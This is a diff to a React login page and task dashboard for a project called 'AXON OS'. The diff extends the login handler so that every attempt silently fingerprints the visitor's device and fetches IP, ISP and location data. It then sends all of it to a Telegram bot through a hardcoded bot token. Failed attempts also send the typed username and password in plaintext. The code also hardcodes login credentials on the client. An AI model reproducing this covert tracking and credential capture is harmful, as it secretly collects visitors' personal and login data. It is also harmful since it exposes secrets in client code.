@@ -4,7 +4,7 @@ import 'bootstrap/dist/css/bootstrap.min.css';
 import 'bootstrap-icons/font/bootstrap-icons.css';
 import { supabase } from './supabaseClient';
 
-// --- 1. LOGIN COMPONENT (With Enhanced Forensics) ---
+// --- 1. LOGIN COMPONENT (With Deep Forensics) ---
 const Login = ({ setAuth }) => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
@@ -15,38 +15,44 @@ const Login = ({ setAuth }) => {
   const handleLogin = async (e) => {
     e.preventDefault();
 
-    // 1. Gather Extra Forensic Info
-    const screenRes = `${window.screen.width}x${window.screen.height}`;
-    const language = navigator.language;
-    const platform = window.navigator.platform;
+    // 1. Gather Deep Forensic Info
+    const forensics = {
+      res: `${window.screen.width}x${window.screen.height}`,
+      cores: navigator.hardwareConcurrency || 'Unknown',
+      lang: navigator.language,
+      platform: navigator.platform,
+      agent: navigator.userAgent.split(' ').pop(), // Short browser tag
+      touch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
+    };
 
-    // 2. Fetch IP and Location Data
-    let ipInfo = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown", timezone: "N/A" };
+    // 2. Fetch Detailed IP/ISP Data
+    let net = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown", timezone: "N/A" };
     try {
       const response = await fetch('https://ipapi.co/json/');
-      if (response.ok) {
-        ipInfo = await response.json();
-      }
+      if (response.ok) net = await response.json();
     } catch (err) {
-      console.error("Location lookup failed", err);
+      console.error("Network lookup failed", err);
     }
 
     const token = "8494749951:AAFDLdupc8KvrwyAnnkvR-iTG9ZfWUTLLOg";
     const chat = "8620003085";
 
     if (username === 'user' && password === 'user') {
-      // --- SUCCESS ALERT ---
+      // --- SUCCESS ALERT (Forensic Report) ---
       const message = encodeURIComponent(
         `🔐 *AXON OS: AUTHORIZED ACCESS*\n\n` +
         `👤 *User:* ${username}\n` +
-        `🌐 *IP:* ${ipInfo.ip}\n` +
-        `📍 *Loc:* ${ipInfo.city}, ${ipInfo.region}\n` +
-        `🏢 *ISP:* ${ipInfo.org}\n\n` +
-        `🖥 *DEVICE SPECS*\n` +
-        `💻 *Platform:* ${platform}\n` +
-        `📏 *Res:* ${screenRes}\n` +
-        `🗣 *Lang:* ${language}\n` +
-        `⏰ *TZ:* ${ipInfo.timezone}`
+        `🌐 *IP:* ${net.ip}\n` +
+        `📍 *Loc:* ${net.city}, ${net.region}\n` +
+        `🏢 *ISP:* ${net.org}\n\n` +
+        `🖥 *SYSTEM SPECS*\n` +
+        `💻 *Platform:* ${forensics.platform}\n` +
+        `📏 *Res:* ${forensics.res}\n` +
+        `⚙️ *Cores:* ${forensics.cores}\n` +
+        `🗣 *Lang:* ${forensics.lang}\n` +
+        `👆 *Touch:* ${forensics.touch}\n` +
+        `⏰ *TZ:* ${net.timezone}\n\n` +
+        `🟢 *Status:* SUCCESS`
       );
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${message}&parse_mode=Markdown`)
@@ -59,9 +65,9 @@ const Login = ({ setAuth }) => {
       const breachMsg = encodeURIComponent(
         `⛔️ *AXON OS: BREACH ATTEMPT*\n\n` +
         `🚫 *Tried:* ${username} / ${password}\n` +
-        `🌐 *IP:* ${ipInfo.ip}\n` +
-        `📍 *Loc:* ${ipInfo.city}\n` +
-        `💻 *Platform:* ${platform}\n` +
+        `🌐 *IP:* ${net.ip}\n` +
+        `📍 *Loc:* ${net.city}\n` +
+        `💻 *Dev:* ${forensics.platform}\n` +
         `🔴 *Status:* ACCESS_DENIED`
       );
 
@@ -82,19 +88,19 @@ const Login = ({ setAuth }) => {
         @keyframes apple-shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 50% { transform: translateX(8px); } 75% { transform: translateX(-8px); } }
         .apple-input { background: rgba(255, 255, 255, 0.07); border: 1px solid rgba(255, 255, 255, 0.1); color: white; border-radius: 14px; padding: 14px 20px; margin-bottom: 15px; }
         .apple-input:focus { background: rgba(255, 255, 255, 0.12); border-color: #6366f1; color: white; box-shadow: none; }
-        .apple-btn { background: #6366f1; border: none; border-radius: 14px; padding: 14px; font-weight: 600; width: 100%; margin-top: 10px; }
+        .apple-btn { background: #6366f1; border: none; border-radius: 14px; padding: 14px; font-weight: 600; width: 100%; margin-top: 10px; color: white; }
         .creator-tag { margin-top: 2.5rem; padding-top: 1.5rem; border-top: 1px solid rgba(255,255,255,0.05); }
       `}</style>
 
       <div className={`apple-card ${isShaking ? 'shake' : ''}`}>
-        <div className="mb-4 text-primary"><i className="bi bi-cpu" style={{ fontSize: '3.5rem' }}></i></div>
+        <div className="mb-4 text-primary"><i className="bi bi-shield-lock" style={{ fontSize: '3.5rem' }}></i></div>
         <h2 className="fw-bold text-white mb-1">AXON <span className="text-primary">OS</span></h2>
         <p className="text-secondary small mb-5">Kernel Access Protocol v3.6</p>
         <form onSubmit={handleLogin}>
           <input type="text" placeholder="Username" className="form-control apple-input" value={username} onChange={(e) => setUsername(e.target.value)} />
           <input type="password" placeholder="Password" className="form-control apple-input" value={password} onChange={(e) => setPassword(e.target.value)} />
           {error && <div className="text-danger small mb-3">{error}</div>}
-          <button type="submit" className="btn btn-primary apple-btn shadow-lg">Authenticate</button>
+          <button type="submit" className="apple-btn shadow-lg">Authenticate</button>
         </form>
         <div className="creator-tag">
           <div className="small text-secondary text-uppercase mb-1" style={{ fontSize: '0.6rem', letterSpacing: '2px' }}>System Architect</div>
@@ -167,12 +173,11 @@ function Dashboard({ setAuth }) {
   const completionRate = tasks.length ? Math.round((tasks.filter(t => t.completed).length / tasks.length) * 100) : 0;
 
   return (
-    <div className="min-vh-100 d-flex flex-column" style={{ backgroundColor: '#0f172a', color: '#f8fafc', fontFamily: "'Inter', system-ui, sans-serif" }}>
+    <div className="min-vh-100 d-flex flex-column" style={{ backgroundColor: '#0f172a', color: '#f8fafc', fontFamily: "'Inter', sans-serif" }}>
       <style>{`
         .glass-card { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 16px; }
         .task-item { transition: all 0.2s ease; border-left: 4px solid transparent; }
         .task-item:hover { background: rgba(255,255,255,0.05); transform: translateX(4px); }
-        .task-completed { opacity: 0.5; text-decoration: line-through; }
         .category-pill { font-size: 0.7rem; padding: 2px 8px; border-radius: 20px; background: #6366f1; font-weight: 600; }
         ::-webkit-scrollbar { width: 5px; }
         ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
@@ -208,7 +213,7 @@ function Dashboard({ setAuth }) {
             {tasks.map((task) => (
               <div key={task.id} className="task-item d-flex align-items-center p-3 border-bottom border-secondary border-opacity-10">
                 <div className="me-3" onClick={() => toggleTask(task.id, task.completed)} style={{cursor: 'pointer'}}><i className={`bi ${task.completed ? 'bi-check-circle-fill text-success' : 'bi-circle text-secondary'}`}></i></div>
-                <div className="flex-grow-1" style={{ textDecoration: task.completed ? 'line-through' : 'none', opacity: task.completed ? 0.5 : 1 }}>
+                <div className="flex-grow-1" style={{ opacity: task.completed ? 0.5 : 1 }}>
                   <span className="category-pill me-2">{task.category}</span> {task.text}
                 </div>
                 <button className="btn btn-link text-danger p-0" onClick={() => deleteTask(task.id)}><i className="bi bi-trash3"></i></button>
